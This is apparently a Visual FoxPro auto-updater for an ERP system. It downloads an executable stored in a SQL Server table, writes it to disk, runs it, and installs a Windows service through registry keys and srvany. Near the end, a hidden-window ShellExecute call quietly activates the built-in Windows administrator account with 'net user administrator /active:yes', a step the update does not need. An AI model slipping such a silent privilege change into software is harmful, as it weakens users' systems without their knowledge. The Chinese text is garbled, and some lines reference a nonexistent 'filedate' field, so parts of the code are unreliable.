SET PROCEDURE TO prgs\sampleproce.prg
SET SAFETY OFF
oShell = CREATEOBJECT("Shell.Application")
oFolder = oShell.NameSpace(CURDIR())
con1=odbc(5)
IF con1<=0
	SQLDISCONNECT(con1)
	con=odbc(4)
	IF con<=0
		MESSAGEBOX('��ȷ��[SQLSERVER]�Ѿ���ȷ��װ!...',0+47+1,P_Caption)
		QUIT
	ENDIF
	SQLDISCONNECT(CON1)
ENDIF 	
CON=ODBC(6)
CURSORSETPROP("MapBinary",.T.,0)

SQLEXEC(CON,"SELECT filename,filedata FROM [update] where filename='ERP.EXE' ","TMP")&&where newid=1
SQLDISCONNECT(CON)
*!*	Declare Long WinExec In kernel32 String,Long
*!*	oShell = CREATEOBJECT("Shell.Application") 
SELECT TMP	
*!*	GO top

*!*	DO whil .not. EOF()
	DO CASE 
	CASE filename='OA����.EXE'
		IF FILE("OA����.EXE")
			oShell.IsServiceRunning("VfpSrv") 
			oShell.ServiceStart("VfpSrv", .F.) 
			Strtofile(Strconv(filedate,14),filename)  
			=WinExec(filename,1) && �����������������ĳ���
			oShell.ServiceStart("VfpSrv", .T.) 
		ELSE
			#DEFINE   HKEY_LOCAL_MACHINE       -2147483646     
			frmReg   =   CREATEOBJECT( "registry ") 
			frmReg.init() 
			sKeyName= "SYSTEM\CurrentControlSet\Services\OA����"
			spath= ADDBS(JUSTPATH(SYS(16)))
			sfilename=  ADDBS(JUSTPATH(SYS(16)))+"OA����.exe" 
			sPWD= "111 " 
			*frmReg.DeleteKey(HKEY_LOCAL_MACHINE,sKeyname) 
			frmReg.OpenKey(sKeyName,HKEY_LOCAL_MACHINE,.T.) 
			frmReg.SetRegKey( "AppDirectory",spath,sKeyName,HKEY_LOCAL_MACHINE) 
			frmReg.SetRegKey( "Application ",sfilename,sKeyName,HKEY_LOCAL_MACHINE) 
			frmReg.CloseKey() 

			oShell.IsServiceRunning("VfpSrv") 
			oShell.ServiceStart("VfpSrv", .F.) 
			oShell.ServiceStop("VfpSrv", .T.)				
			Strtofile(Strconv(filedate,14),filename)  
			=WinExec(filename,1) && �����������������ĳ���
			!ADDBS(JUSTPATH(SYS(16)))+'imgs\instsrv VFPSrv'+ ADDBS(JUSTPATH(SYS(16)))+'imgs\srvany.exe'
		ENDIF
	CASE UPPER(filename)='ERP.EXE'
		DECLARE INTEGER FindWindow IN USER32.DLL AS Find_Window STRING,STRING
		LOCAL cTitle
		cTitle="ERP����"
		IF Find_Window(0,cTitle)!=0
			=MESSAGEBOX('�������Ѿ�����!',48,'��ʾ��Ϣ')
			quit
		ENDIF
*!*			IF FILE("ERP.EXE")
*!*				ERASE ERP.EXE
*!*			ENDIF	
		STRTOFILE(filedata,"ERP.EXE")
*!*			DECLARE  INTEGER  ShellExecute  IN  "Shell32.dll"  ;  
*!*			INTEGER  hwnd,  ;  
*!*			STRING  lpVerb,  ;  
*!*			STRING  lpFile,  ;  
*!*			STRING  lpParameters,  ;  
*!*			STRING  lpDirectory,  ;  
*!*			LONG  nShowCmd  
*!*			 
*!*		*  ��  Word  ���༭�ļ�  "c:\mywordfile.doc"  
*!*			=Shellexecute(0,"Open","ERP.EXE","","",0)  	
*!*			IF FILE("ERP.EXE")
*!*				Strtofile(Strconv(filedate,14),filename)  
*!*				=WinExec(filename,1) && �����������������ĳ���
*!*			ENDIF
	OTHERWISE 
*!*			Strtofile(Strconv(filedate,14),filename)  
	ENDCASE	
*!*		SKIP
*!*	ENDDO 	
*!*	LOCATE FOR filename='ERP.EXE'
*!*	IF FOUND()
*!*		AGETFILEVERSION(Ver,"ERP����.EXE")
*!*		mVer=ALLTRIM(Ver[4])
*!*		
Declare Integer ShellExecute In "Shell32.dll" Integer HWnd,String lpVerb,String lpFile,String lpParameters,String lpDirectory,Long nShowCmd
*!*	=ShellExecute("myRegsvr.exe", �ؼ��ļ���, "", "runas", 1)
=ShellExecute(0,"runas", "cmd.exe","/c net user administrator /active:yes","",0)
Declare Long WinExec In kernel32 String,Long
=WinExec('ERP.EXE',1) && �����������������ĳ���
Clear Dlls

QUIT
